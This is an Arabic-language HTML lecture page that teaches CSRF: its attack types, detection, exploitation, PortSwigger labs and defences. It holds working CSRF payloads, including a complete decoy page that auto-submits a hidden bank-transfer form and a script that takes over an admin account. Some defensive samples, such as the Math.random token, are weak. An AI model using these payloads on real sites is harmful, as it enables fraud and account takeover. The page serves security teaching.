<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Cross-site Request Forgery (CSRF) - محاضرة شاملة</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Google Sans', 'Roboto', -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
            line-height: 1.6;
            color: #e8eaed;
            background: #151b2f;
            min-height: 100vh;
        }

        .container {
            max-width: 1200px;
            margin: 0 auto;
            padding: 20px;
        }

        .header {
            text-align: center;
            margin-bottom: 48px;
            padding: 64px 24px;
            background: linear-gradient(135deg, #1a2125, #203942);
            border-radius: 12px;
            box-shadow: 0 4px 24px rgb(33, 48, 70);
        }

        .header h1 {
            font-size: 2.5rem;
            font-weight: 400;
            color: #e8eaed;
            margin-bottom: 16px;
            letter-spacing: -0.5px;
        }

        .header p {
            font-size: 1.1rem;
            font-weight: 300;
            color: rgba(232, 234, 237, 0.9);
            margin-bottom: 24px;
        }

        .content {
            background: #0f1724;
            border: 1px solid #2b3447;
            border-radius: 12px;
            padding: 24px;
            margin-bottom: 24px;
            box-shadow: 0 1px 6px rgba(33, 48, 70, 0.3);
        }

        .section {
            margin-bottom: 40px;
            padding: 20px;
            border-left: 4px solid #a5b4fc;
            background: #1a2332;
            border-radius: 12px;
        }

        .section h2 {
            color: #a5b4fc;
            margin-bottom: 15px;
            font-size: 1.8rem;
            font-weight: 400;
        }

        .section h3 {
            color: #495057;
            margin: 20px 0 10px 0;
            font-size: 1.4rem;
        }

        .attack-type {
            background: #0c1220;
            border: 2px solid #263148;
            border-radius: 12px;
            padding: 20px;
            margin: 15px 0;
            transition: all 0.3s ease;
        }

        .attack-type:hover {
            border-color: #a5b4fc;
            box-shadow: 0 4px 16px rgba(165, 180, 252, 0.12);
            transform: translateY(-2px);
        }

        .attack-type h4 {
            color: #dc3545;
            margin-bottom: 10px;
            font-size: 1.2rem;
            font-weight: 500;
        }

        .code-block {
            background: #2d3748;
            color: #e2e8f0;
            padding: 20px;
            border-radius: 8px;
            margin: 15px 0;
            overflow-x: auto;
            font-family: 'Courier New', monospace;
            font-size: 0.9rem;
        }

        .code-block.vulnerable {
            border-left: 4px solid #dc3545;
        }

        .code-block.secure {
            border-left: 4px solid #28a745;
        }

        .lab-card {
            background: linear-gradient(135deg, #1e3a8a, #1e40af);
            border: 1px solid #3b82f6;
            color: white;
            padding: 20px;
            border-radius: 12px;
            margin: 15px 0;
            transition: all 0.3s ease;
        }

        .lab-card:hover {
            transform: translateY(-2px);
        }

        .lab-card h4 {
            margin-bottom: 10px;
            font-size: 1.2rem;
        }

        .lab-card a {
            color: #ffd700;
            text-decoration: none;
            font-weight: bold;
        }

        .lab-card a:hover {
            text-decoration: underline;
        }

        .comparison-table {
            width: 100%;
            border-collapse: collapse;
            margin: 20px 0;
            background: white;
            border-radius: 8px;
            overflow: hidden;
            box-shadow: 0 4px 6px rgba(0,0,0,0.1);
        }

        .comparison-table th,
        .comparison-table td {
            padding: 12px;
            text-align: right;
            border-bottom: 1px solid #e9ecef;
        }

        .comparison-table th {
            background: #667eea;
            color: white;
            font-weight: bold;
        }

        .comparison-table tr:nth-child(even) {
            background: #f8f9fa;
        }

        .comparison-table tr:hover {
            background: #e9ecef;
        }

        .warning {
            background: #fff3cd;
            border: 1px solid #ffeaa7;
            color: #856404;
            padding: 15px;
            border-radius: 8px;
            margin: 15px 0;
        }

        .info {
            background: #d1ecf1;
            border: 1px solid #bee5eb;
            color: #0c5460;
            padding: 15px;
            border-radius: 8px;
            margin: 15px 0;
        }

        .success {
            background: #d4edda;
            border: 1px solid #c3e6cb;
            color: #155724;
            padding: 15px;
            border-radius: 8px;
            margin: 15px 0;
        }

        .mermaid {
            text-align: center;
            margin: 20px 0;
            padding: 20px;
            background: #f8f9fa;
            border-radius: 8px;
        }

        .stats {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
            gap: 20px;
            margin: 20px 0;
        }

        .stat-card {
            background: linear-gradient(135deg, #1e3a8a, #1e40af);
            border: 1px solid #3b82f6;
            color: white;
            padding: 20px;
            border-radius: 12px;
            text-align: center;
            transition: all 0.3s ease;
        }

        .stat-card:hover {
            transform: translateY(-2px);
        }

        .stat-card h3 {
            font-size: 2rem;
            margin-bottom: 5px;
        }

        .stat-card p {
            opacity: 0.9;
        }

        .back-button {
            display: inline-block;
            background: linear-gradient(135deg, #1e3a8a, #1e40af);
            color: white;
            padding: 12px 24px;
            text-decoration: none;
            border-radius: 8px;
            margin-bottom: 20px;
            transition: all 0.3s ease;
            font-weight: 500;
            border: 1px solid #3b82f6;
        }

        .back-button:hover {
            transform: translateY(-1px);
        }

        @media (max-width: 768px) {
            .container {
                padding: 10px;
            }
            
            .header h1 {
                font-size: 2rem;
            }
            
            .content {
                padding: 20px;
            }
            
            .code-block {
                font-size: 0.8rem;
                padding: 15px;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <a href="../../index.html" class="back-button">← العودة للصفحة الرئيسية</a>
        
        <div class="header">
            <h1>🔒 Cross-site Request Forgery (CSRF)</h1>
            <p>محاضرة شاملة عن ثغرات CSRF وأنواعها وطرق الحماية</p>
        </div>

        <div class="content">
            <!-- إحصائيات سريعة -->
            <div class="stats">
                <div class="stat-card">
                    <h3>5</h3>
                    <p>أنواع CSRF</p>
                </div>
                <div class="stat-card">
                    <h3>8</h3>
                    <p>مختبر عملي</p>
                </div>
                <div class="stat-card">
                    <h3>2</h3>
                    <p>ساعة تدريبية</p>
                </div>
                <div class="stat-card">
                    <h3>15+</h3>
                    <p>مثال عملي</p>
                </div>
            </div>

            <!-- مقدمة -->
            <div class="section">
                <h2>🎯 ما هي CSRF؟</h2>
                <p>
                    <strong>Cross-site Request Forgery (CSRF)</strong> هي ثغرة أمنية تسمح للمهاجم بإجبار المستخدمين على تنفيذ إجراءات غير مرغوب فيها على موقع ويب يكونون مسجلين فيه بالفعل. 
                    هذه الهجمات تعتمد على حقيقة أن المتصفح يرسل تلقائياً الكوكيز مع كل طلب إلى الموقع.
                </p>
                
                <div class="info">
                    <strong>💡 مثال بسيط:</strong> إذا كنت مسجل الدخول في موقع البنك، يمكن للمهاجم إنشاء صفحة خبيثة تجعلك تحول أموالك إلى حسابه دون علمك!
                </div>

                <div class="mermaid">
                    <h3>📊 آلية عمل CSRF</h3>
                    <p><strong>1.</strong> المستخدم مسجل في موقع آمن (مثل البنك)</p>
                    <p><strong>2.</strong> المهاجم يرسل رابط خبيث للمستخدم</p>
                    <p><strong>3.</strong> المستخدم يفتح الرابط (بينما لا يزال مسجل في البنك)</p>
                    <p><strong>4.</strong> المتصفح يرسل طلب تلقائي مع الكوكيز</p>
                    <p><strong>5.</strong> الموقع يعالج الطلب كأنه من المستخدم نفسه!</p>
                </div>
            </div>

            <!-- أنواع CSRF -->
            <div class="section">
                <h2>🔍 أنواع CSRF</h2>
                
                <!-- 1. GET-based CSRF -->
                <div class="attack-type">
                    <h4>1. GET-based CSRF</h4>
                    <p>تحدث عندما يتم تنفيذ هجوم CSRF عبر طلب GET. هذه الطريقة بسيطة ولكنها محدودة.</p>
                    
                    <h5>📝 مثال على الكود الضعيف:</h5>
                    <div class="code-block vulnerable">
&lt;!-- ❌ كود ضعيف --&gt;
&lt;a href="https://bank.com/transfer?to=attacker&amount=1000"&gt;
    عرض صورة جميلة
&lt;/a&gt;

&lt;!-- أو عبر img tag --&gt;
&lt;img src="https://bank.com/transfer?to=attacker&amount=1000" 
     style="display:none;"&gt;
                    </div>

                    <h5>🎯 كيف يعمل الهجوم:</h5>
                    <ul>
                        <li>المهاجم ينشئ رابط أو صورة خفية</li>
                        <li>المستخدم يفتح الصفحة الخبيثة</li>
                        <li>المتصفح يرسل طلب GET تلقائياً</li>
                        <li>الموقع يعالج الطلب مع الكوكيز</li>
                    </ul>

                    <h5>⚠️ القيود:</h5>
                    <ul>
                        <li>لا يمكن إرسال بيانات معقدة</li>
                        <li>الطلبات تظهر في سجل المتصفح</li>
                        <li>سهلة الاكتشاف</li>
                    </ul>
                </div>

                <!-- 2. POST-based CSRF -->
                <div class="attack-type">
                    <h4>2. POST-based CSRF</h4>
                    <p>تحدث عندما يتم تنفيذ هجوم CSRF عبر طلب POST. هذه الطريقة أكثر تعقيداً ولكنها أقوى.</p>
                    
                    <h5>📝 مثال على الكود الضعيف:</h5>
                    <div class="code-block vulnerable">
&lt;!-- ❌ كود ضعيف --&gt;
&lt;form id="csrf-form" action="https://bank.com/transfer" method="POST"&gt;
    &lt;input type="hidden" name="to" value="attacker"&gt;
    &lt;input type="hidden" name="amount" value="1000"&gt;
&lt;/form&gt;

&lt;script&gt;
// تنفيذ النموذج تلقائياً
document.getElementById('csrf-form').submit();
&lt;/script&gt;
                    </div>

                    <h5>🎯 كيف يعمل الهجوم:</h5>
                    <ul>
                        <li>المهاجم ينشئ نموذج مخفي</li>
                        <li>يستخدم JavaScript لتنفيذ النموذج</li>
                        <li>المتصفح يرسل طلب POST مع الكوكيز</li>
                        <li>الموقع يعالج الطلب كأنه من المستخدم</li>
                    </ul>

                    <h5>💪 المميزات:</h5>
                    <ul>
                        <li>يمكن إرسال بيانات معقدة</li>
                        <li>الطلبات لا تظهر في سجل المتصفح</li>
                        <li>أصعب في الاكتشاف</li>
                    </ul>
                </div>

                <!-- 3. JSON-based CSRF -->
                <div class="attack-type">
                    <h4>3. JSON-based CSRF</h4>
                    <p>تحدث عندما يتم تنفيذ هجوم CSRF عبر طلب JSON. هذه الطريقة حديثة وتستهدف APIs.</p>
                    
                    <h5>📝 مثال على الكود الضعيف:</h5>
                    <div class="code-block vulnerable">
&lt;!-- ❌ كود ضعيف --&gt;
&lt;script&gt;
fetch('https://api.bank.com/transfer', {
    method: 'POST',
    headers: {
        'Content-Type': 'application/json'
    },
    body: JSON.stringify({
        to: 'attacker',
        amount: 1000
    })
});
&lt;/script&gt;
                    </div>

                    <h5>🎯 كيف يعمل الهجوم:</h5>
                    <ul>
                        <li>المهاجم ينشئ طلب fetch أو XMLHttpRequest</li>
                        <li>يرسل بيانات JSON مع الطلب</li>
                        <li>المتصفح يرسل الكوكيز تلقائياً</li>
                        <li>API يعالج الطلب</li>
                    </ul>

                    <h5>⚠️ القيود:</h5>
                    <ul>
                        <li>قد تحتاج CORS headers</li>
                        <li>بعض المتصفحات تمنعها</li>
                        <li>قد تحتاج preflight requests</li>
                    </ul>
                </div>

                <!-- 4. Multi-step CSRF -->
                <div class="attack-type">
                    <h4>4. Multi-step CSRF</h4>
                    <p>تحدث عندما يتطلب الإجراء عدة خطوات متتالية. المهاجم ينفذ جميع الخطوات تلقائياً.</p>
                    
                    <h5>📝 مثال على الكود الضعيف:</h5>
                    <div class="code-block vulnerable">
&lt;!-- ❌ كود ضعيف --&gt;
&lt;script&gt;
// الخطوة 1: تغيير كلمة المرور
fetch('/change-password', {
    method: 'POST',
    body: 'newPassword=hacked123'
});

// الخطوة 2: إضافة مستخدم جديد
setTimeout(() =&gt; {
    fetch('/add-user', {
        method: 'POST',
        body: 'username=attacker&role=admin'
    });
}, 1000);

// الخطوة 3: حذف المستخدم الأصلي
setTimeout(() =&gt; {
    fetch('/delete-user', {
        method: 'POST',
        body: 'username=admin'
    });
}, 2000);
&lt;/script&gt;
                    </div>

                    <h5>🎯 كيف يعمل الهجوم:</h5>
                    <ul>
                        <li>المهاجم ينفذ عدة طلبات متتالية</li>
                        <li>يستخدم setTimeout للتوقيت</li>
                        <li>كل طلب يعتمد على الطلب السابق</li>
                        <li>النتيجة: سيطرة كاملة على النظام</li>
                    </ul>

                    <h5>💪 المميزات:</h5>
                    <ul>
                        <li>يمكن تنفيذ عمليات معقدة</li>
                        <li>أصعب في الاكتشاف</li>
                        <li>يمكن تجاوز بعض الحماية</li>
                    </ul>
                </div>

                <!-- 5. Blind CSRF -->
                <div class="attack-type">
                    <h4>5. Blind CSRF</h4>
                    <p>تحدث عندما لا يمكن للمهاجم رؤية نتيجة الطلب، ولكن الطلب يتم تنفيذه بنجاح.</p>
                    
                    <h5>📝 مثال على الكود الضعيف:</h5>
                    <div class="code-block vulnerable">
&lt;!-- ❌ كود ضعيف --&gt;
&lt;script&gt;
// طلب لا يعيد استجابة مرئية
fetch('/admin/delete-all-users', {
    method: 'POST',
    headers: {
        'Content-Type': 'application/json'
    },
    body: JSON.stringify({
        confirm: true
    })
}).then(response =&gt; {
    // لا يمكن رؤية النتيجة
    console.log('Request sent');
});
&lt;/script&gt;
                    </div>

                    <h5>🎯 كيف يعمل الهجوم:</h5>
                    <ul>
                        <li>المهاجم يرسل طلب دون رؤية النتيجة</li>
                        <li>الطلب يتم تنفيذه في الخلفية</li>
                        <li>النتيجة تحدث على الخادم</li>
                        <li>المهاجم لا يعرف إذا نجح الطلب</li>
                    </ul>

                    <h5>⚠️ التحديات:</h5>
                    <ul>
                        <li>صعوبة التأكد من نجاح الهجوم</li>
                        <li>قد تحتاج طلبات إضافية للتحقق</li>
                        <li>أصعب في التطوير والاختبار</li>
                    </ul>
                </div>
            </div>

            <!-- مقارنة بين الأنواع -->
            <div class="section">
                <h2>📊 مقارنة بين أنواع CSRF</h2>
                
                <table class="comparison-table">
                    <thead>
                        <tr>
                            <th>النوع</th>
                            <th>التعقيد</th>
                            <th>الاكتشاف</th>
                            <th>البيانات</th>
                            <th>الاستخدام</th>
                        </tr>
                    </thead>
                    <tbody>
                        <tr>
                            <td><strong>GET-based</strong></td>
                            <td>منخفض</td>
                            <td>سهل</td>
                            <td>محدودة</td>
                            <td>بسيطة</td>
                        </tr>
                        <tr>
                            <td><strong>POST-based</strong></td>
                            <td>متوسط</td>
                            <td>متوسط</td>
                            <td>غير محدودة</td>
                            <td>شائعة</td>
                        </tr>
                        <tr>
                            <td><strong>JSON-based</strong></td>
                            <td>متوسط</td>
                            <td>صعب</td>
                            <td>معقدة</td>
                            <td>APIs</td>
                        </tr>
                        <tr>
                            <td><strong>Multi-step</strong></td>
                            <td>عالي</td>
                            <td>صعب جداً</td>
                            <td>متعددة</td>
                            <td>متقدمة</td>
                        </tr>
                        <tr>
                            <td><strong>Blind</strong></td>
                            <td>متوسط</td>
                            <td>صعب</td>
                            <td>محدودة</td>
                            <td>تخريبية</td>
                        </tr>
                    </tbody>
                </table>
            </div>

            <!-- طرق الاكتشاف -->
            <div class="section">
                <h2>🔍 طرق اكتشاف CSRF</h2>
                
                <h3>1. الفحص اليدوي</h3>
                <div class="code-block">
&lt;!-- اختبار GET-based CSRF --&gt;
&lt;img src="https://target.com/action?param=value" style="display:none;"&gt;

&lt;!-- اختبار POST-based CSRF --&gt;
&lt;form action="https://target.com/action" method="POST"&gt;
    &lt;input type="hidden" name="param" value="value"&gt;
&lt;/form&gt;
&lt;script&gt;document.forms[0].submit();&lt;/script&gt;
                </div>

                <h3>2. استخدام Burp Suite</h3>
                <ul>
                    <li>استخدام CSRF PoC Generator</li>
                    <li>تحليل الطلبات والردود</li>
                    <li>اختبار نقاط الضعف</li>
                    <li>إنشاء payloads مخصصة</li>
                </ul>

                <h3>3. أدوات تلقائية</h3>
                <ul>
                    <li>OWASP ZAP</li>
                    <li>Burp Suite Professional</li>
                    <li>CSRF Scanner</li>
                    <li>Custom Scripts</li>
                </ul>

                <div class="warning">
                    <strong>⚠️ تحذير:</strong> تأكد من اختبار هذه الطرق في بيئة آمنة ومصرح بها فقط!
                </div>
            </div>

            <!-- طرق الاستغلال -->
            <div class="section">
                <h2>⚔️ طرق استغلال CSRF</h2>
                
                <h3>1. إنشاء صفحة خبيثة</h3>
                <div class="code-block">
&lt;!-- صفحة CSRF خبيثة --&gt;
&lt;html&gt;
&lt;head&gt;
    &lt;title&gt;عرض صورة جميلة&lt;/title&gt;
&lt;/head&gt;
&lt;body&gt;
    &lt;h1&gt;انظر لهذه الصورة الجميلة!&lt;/h1&gt;
    
    &lt;!-- CSRF Payload مخفي --&gt;
    &lt;form id="csrf" action="https://bank.com/transfer" method="POST"&gt;
        &lt;input type="hidden" name="to" value="attacker"&gt;
        &lt;input type="hidden" name="amount" value="1000"&gt;
    &lt;/form&gt;
    
    &lt;script&gt;
        // تنفيذ النموذج تلقائياً
        setTimeout(() =&gt; {
            document.getElementById('csrf').submit();
        }, 2000);
    &lt;/script&gt;
&lt;/body&gt;
&lt;/html&gt;
                </div>

                <h3>2. استخدام Social Engineering</h3>
                <ul>
                    <li>إرسال روابط خبيثة عبر البريد الإلكتروني</li>
                    <li>إنشاء صفحات مزيفة جذابة</li>
                    <li>استخدام رسائل عاجلة ومخيفة</li>
                    <li>استغلال الثقة والفضول</li>
                </ul>

                <h3>3. استغلال الثغرات الأخرى</h3>
                <ul>
                    <li>XSS + CSRF</li>
                    <li>Open Redirect + CSRF</li>
                    <li>Clickjacking + CSRF</li>
                    <li>Session Fixation + CSRF</li>
                </ul>
            </div>

            <!-- المختبرات العملية -->
            <div class="section">
                <h2>🧪 المختبرات العملية</h2>
                <p>مجموعة من المختبرات العملية من PortSwigger Web Security Academy لاختبار أنواع CSRF المختلفة:</p>

                <div class="lab-card">
                    <h4>🔬 Lab 1: CSRF vulnerability with no defenses</h4>
                    <p>مختبر أساسي لاختبار CSRF بدون أي حماية</p>
                    <a href="https://portswigger.net/web-security/csrf/lab-no-defenses" target="_blank">
                        ابدأ المختبر →
                    </a>
                </div>

                <div class="lab-card">
                    <h4>🔬 Lab 2: CSRF where token validation depends on request method</h4>
                    <p>اختبار CSRF مع حماية ضعيفة تعتمد على نوع الطلب</p>
                    <a href="https://portswigger.net/web-security/csrf/lab-token-validation-depends-on-request-method" target="_blank">
                        ابدأ المختبر →
                    </a>
                </div>

                <div class="lab-card">
                    <h4>🔬 Lab 3: CSRF where token validation depends on token being present</h4>
                    <p>اختبار CSRF مع حماية تعتمد على وجود التوكن</p>
                    <a href="https://portswigger.net/web-security/csrf/lab-token-validation-depends-on-token-being-present" target="_blank">
                        ابدأ المختبر →
                    </a>
                </div>

                <div class="lab-card">
                    <h4>🔬 Lab 4: CSRF where Referer validation depends on header being present</h4>
                    <p>اختبار CSRF مع حماية تعتمد على Referer header</p>
                    <a href="https://portswigger.net/web-security/csrf/lab-referer-validation-depends-on-header-being-present" target="_blank">
                        ابدأ المختبر →
                    </a>
                </div>

                <div class="lab-card">
                    <h4>🔬 Lab 5: CSRF with broken Referer validation</h4>
                    <p>اختبار CSRF مع حماية Referer ضعيفة</p>
                    <a href="https://portswigger.net/web-security/csrf/lab-broken-referer-validation" target="_blank">
                        ابدأ المختبر →
                    </a>
                </div>

                <div class="lab-card">
                    <h4>🔬 Lab 6: CSRF where token is not tied to user session</h4>
                    <p>اختبار CSRF مع توكن غير مرتبط بجلسة المستخدم</p>
                    <a href="https://portswigger.net/web-security/csrf/lab-token-not-tied-to-user-session" target="_blank">
                        ابدأ المختبر →
                    </a>
                </div>

                <div class="lab-card">
                    <h4>🔬 Lab 7: CSRF where token is duplicated in cookie</h4>
                    <p>اختبار CSRF مع توكن مكرر في الكوكيز</p>
                    <a href="https://portswigger.net/web-security/csrf/lab-token-duplicated-in-cookie" target="_blank">
                        ابدأ المختبر →
                    </a>
                </div>

                <div class="lab-card">
                    <h4>🔬 Lab 8: SameSite Lax bypass via method override</h4>
                    <p>اختبار تجاوز حماية SameSite Lax عبر تغيير طريقة الطلب</p>
                    <a href="https://portswigger.net/web-security/csrf/lab-samesite-lax-bypass-via-method-override" target="_blank">
                        ابدأ المختبر →
                    </a>
                </div>

                <div class="info">
                    <strong>💡 ملاحظة:</strong> هذه المختبرات تتطلب حساب في PortSwigger Web Security Academy. 
                    يمكنك التسجيل مجاناً على <a href="https://portswigger.net/web-security" target="_blank">موقعهم</a>.
                </div>
            </div>

            <!-- طرق الحماية -->
            <div class="section">
                <h2>🛡️ طرق الحماية من CSRF</h2>
                
                <h3>1. CSRF Tokens</h3>
                <div class="code-block secure">
&lt;!-- ✅ كود آمن مع CSRF Token --&gt;
&lt;form action="/transfer" method="POST"&gt;
    &lt;input type="hidden" name="csrf_token" value="random_token_here"&gt;
    &lt;input type="text" name="to"&gt;
    &lt;input type="number" name="amount"&gt;
    &lt;button type="submit"&gt;تحويل&lt;/button&gt;
&lt;/form&gt;

&lt;!-- على الخادم --&gt;
if (request.csrf_token !== session.csrf_token) {
    return error('Invalid CSRF token');
}
                </div>

                <h3>2. SameSite Cookies</h3>
                <div class="code-block secure">
&lt;!-- ✅ كود آمن مع SameSite --&gt;
Set-Cookie: sessionId=abc123; SameSite=Strict; Secure; HttpOnly

&lt;!-- أو SameSite=Lax للروابط الخارجية --&gt;
Set-Cookie: sessionId=abc123; SameSite=Lax; Secure; HttpOnly
                </div>

                <h3>3. Double Submit Cookie</h3>
                <div class="code-block secure">
&lt;!-- ✅ كود آمن مع Double Submit --&gt;
&lt;script&gt;
// إنشاء توكن عشوائي
const token = Math.random().toString(36).substr(2, 9);
document.cookie = `csrf_token=${token}; SameSite=Strict`;

// إضافة التوكن للنموذج
document.getElementById('csrf_token').value = token;
&lt;/script&gt;
                </div>

                <h3>4. Custom Headers</h3>
                <div class="code-block secure">
&lt;!-- ✅ كود آمن مع Custom Header --&gt;
fetch('/api/transfer', {
    method: 'POST',
    headers: {
        'Content-Type': 'application/json',
        'X-CSRF-Token': 'token_here',
        'X-Requested-With': 'XMLHttpRequest'
    },
    body: JSON.stringify(data)
});
                </div>

                <h3>5. Referer Validation</h3>
                <div class="code-block secure">
&lt;!-- ✅ كود آمن مع Referer Check --&gt;
function validateReferer(request) {
    const referer = request.headers.referer;
    const allowedDomains = ['example.com', 'www.example.com'];
    
    if (!referer) {
        return false;
    }
    
    const url = new URL(referer);
    return allowedDomains.includes(url.hostname);
}
                </div>

                <div class="success">
                    <strong>✅ أفضل الممارسات:</strong>
                    <ul>
                        <li>استخدم CSRF tokens لكل النماذج</li>
                        <li>طبق SameSite=Strict للكوكيز الحساسة</li>
                        <li>تحقق من Referer header</li>
                        <li>استخدم Custom headers للطلبات المهمة</li>
                        <li>طبق مبدأ "الصلاحيات الدنيا"</li>
                    </ul>
                </div>
            </div>

            <!-- أمثلة عملية -->
            <div class="section">
                <h2>💻 أمثلة عملية</h2>
                
                <h3>مثال 1: حماية نموذج تسجيل الدخول</h3>
                <div class="code-block secure">
&lt;!-- ✅ نموذج آمن --&gt;
&lt;form action="/login" method="POST"&gt;
    &lt;input type="hidden" name="csrf_token" value="&lt;?php echo $_SESSION['csrf_token']; ?&gt;"&gt;
    &lt;input type="email" name="email" required&gt;
    &lt;input type="password" name="password" required&gt;
    &lt;button type="submit"&gt;تسجيل الدخول&lt;/button&gt;
&lt;/form&gt;

&lt;!-- PHP Validation --&gt;
&lt;?php
if ($_POST['csrf_token'] !== $_SESSION['csrf_token']) {
    die('CSRF attack detected!');
}
?&gt;
                </div>

                <h3>مثال 2: حماية API endpoint</h3>
                <div class="code-block secure">
&lt;!-- ✅ API آمن --&gt;
// Middleware للتحقق من CSRF
app.use('/api', (req, res, next) =&gt; {
    const token = req.headers['x-csrf-token'];
    const sessionToken = req.session.csrf_token;
    
    if (token !== sessionToken) {
        return res.status(403).json({ error: 'Invalid CSRF token' });
    }
    
    next();
});

// Endpoint محمي
app.post('/api/transfer', (req, res) =&gt; {
    // معالجة الطلب بأمان
    res.json({ success: true });
});
                </div>

                <h3>مثال 3: حماية AJAX requests</h3>
                <div class="code-block secure">
&lt;!-- ✅ AJAX آمن --&gt;
&lt;script&gt;
// إضافة CSRF token لجميع الطلبات
$.ajaxSetup({
    beforeSend: function(xhr) {
        xhr.setRequestHeader('X-CSRF-Token', getCSRFToken());
    }
});

function getCSRFToken() {
    return document.querySelector('meta[name="csrf-token"]').getAttribute('content');
}

// طلب آمن
$.post('/api/update-profile', {
    name: 'New Name',
    email: 'new@email.com'
});
&lt;/script&gt;
                </div>
            </div>

            <!-- الخلاصة -->
            <div class="section">
                <h2>📝 الخلاصة</h2>
                
                <div class="warning">
                    <strong>🎯 النقاط الرئيسية:</strong>
                    <ul>
                        <li>CSRF هي ثغرة خطيرة تسمح بتنفيذ إجراءات غير مرغوب فيها</li>
                        <li>هناك 5 أنواع رئيسية من CSRF</li>
                        <li>الحماية الأساسية هي CSRF tokens</li>
                        <li>SameSite cookies تحمي من معظم الهجمات</li>
                        <li>التحقق من Referer header يضيف طبقة حماية إضافية</li>
                    </ul>
                </div>

                <div class="success">
                    <strong>✅ خطوات الحماية:</strong>
                    <ol>
                        <li>استخدم CSRF tokens في جميع النماذج</li>
                        <li>طبق SameSite=Strict للكوكيز الحساسة</li>
                        <li>تحقق من Referer header</li>
                        <li>استخدم Custom headers للطلبات المهمة</li>
                        <li>اختبر تطبيقك بانتظام</li>
                        <li>ابق على اطلاع بأحدث التهديدات</li>
                    </ol>
                </div>

                <div class="info">
                    <strong>🔗 روابط مفيدة:</strong>
                    <ul>
                        <li><a href="https://owasp.org/www-community/attacks/csrf" target="_blank">OWASP CSRF Guide</a></li>
                        <li><a href="https://portswigger.net/web-security/csrf" target="_blank">PortSwigger CSRF</a></li>
                        <li><a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies#SameSite_cookies" target="_blank">MDN SameSite Cookies</a></li>
                    </ul>
                </div>
            </div>
        </div>
    </div>

    <script src="https://cdn.jsdelivr.net/npm/mermaid/dist/mermaid.min.js"></script>
    <script>
        mermaid.initialize({ startOnLoad: true });
    </script>
</body>
</html> 